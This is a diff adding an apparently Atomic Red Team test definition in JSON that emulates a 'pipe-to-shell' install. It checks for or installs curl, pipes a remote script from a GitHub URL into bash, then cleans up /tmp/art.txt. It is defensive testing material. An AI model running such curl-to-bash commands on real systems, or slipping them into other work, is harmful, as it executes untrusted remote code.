@@ -1,0 +1,105 @@
+{
+  "id": "fca246a8-a585-4f28-a2df-6495973976a1",
+  "name": "Detecting pipe-to-shell",
+  "description": "An adversary may develop a useful utility or subvert the CI/CD pipe line of a legitimate utility developer, who requires or suggests installing their utility by piping a curl download directly into bash. Of-course this is a very bad idea. The adversary may also take advantage of this BLIND install method and selectively running extra commands in the install script for those who DO pipe to bash and not for those who DO NOT. This test uses curl to download the pipe-to-shell.sh script, the first time without piping it to bash and the second piping it into bash which executes the echo command.\n",
+  "platforms": [
+    "linux"
+  ],
+  "steps": [
+    {
+      "id": "86fbb077-8140-437d-baef-22d39383196f",
+      "type": "execute-command",
+      "data": {
+        "command": "cd /tmp\ncurl -s #{remote_url} |bash\nls -la /tmp/art.txt      \n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "b27a564b-431f-4e17-b729-610e6f972d0a",
+      "type": "execute-command",
+      "data": {
+        "command": "rm /tmp/art.txt\n",
+        "command_type": "sh"
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "b61c9b54-8217-436f-bb98-1ab136d313bb",
+      "name": "Check dependency 1/1",
+      "description": "Check if curl is installed on the machine.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "98823b30-534e-47ff-9804-12089b358b30",
+      "name": "Resolve dependency 1/1",
+      "description": "Check if curl is installed on the machine.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "which apt \u0026\u0026 apt update \u0026\u0026 apt install -y curl || which pkg \u0026\u0026 pkg update \u0026\u0026 pkg install -y curl\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    },
+    {
+      "id": "8ea3319c-c404-49af-a8a0-a8c05b0542b3",
+      "name": "Re-check dependency 1/1",
+      "description": "Check if curl is installed on the machine.\n",
+      "type": "execute-command",
+      "data": {
+        "command": "if [ -x \"$(command -v curl)\" ]; then echo \"curl is installed\"; else echo \"curl is NOT installed\"; exit 1; fi\n",
+        "command_type": ""
+      },
+      "elevation_required": false
+    }
+  ],
+  "flows": [
+    {
+      "s": "86fbb077-8140-437d-baef-22d39383196f",
+      "p": "on-success",
+      "o": "b27a564b-431f-4e17-b729-610e6f972d0a"
+    },
+    {
+      "s": "86fbb077-8140-437d-baef-22d39383196f",
+      "p": "on-failure",
+      "o": "b27a564b-431f-4e17-b729-610e6f972d0a"
+    },
+    {
+      "s": "b61c9b54-8217-436f-bb98-1ab136d313bb",
+      "p": "on-success",
+      "o": "86fbb077-8140-437d-baef-22d39383196f"
+    },
+    {
+      "s": "b61c9b54-8217-436f-bb98-1ab136d313bb",
+      "p": "on-failure",
+      "o": "98823b30-534e-47ff-9804-12089b358b30"
+    },
+    {
+      "s": "98823b30-534e-47ff-9804-12089b358b30",
+      "p": "on-success",
+      "o": "8ea3319c-c404-49af-a8a0-a8c05b0542b3"
+    },
+    {
+      "s": "8ea3319c-c404-49af-a8a0-a8c05b0542b3",
+      "p": "on-failure",
+      "o": "86fbb077-8140-437d-baef-22d39383196f"
+    }
+  ],
+  "tags": [
+    "T1059.004",
+    "atomic-red-team"
+  ],
+  "input_arguments": [
+    {
+      "name": "remote_url",
+      "type": "url",
+      "description": "url of remote payload",
+      "value": "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh"
+    }
+  ]
+}
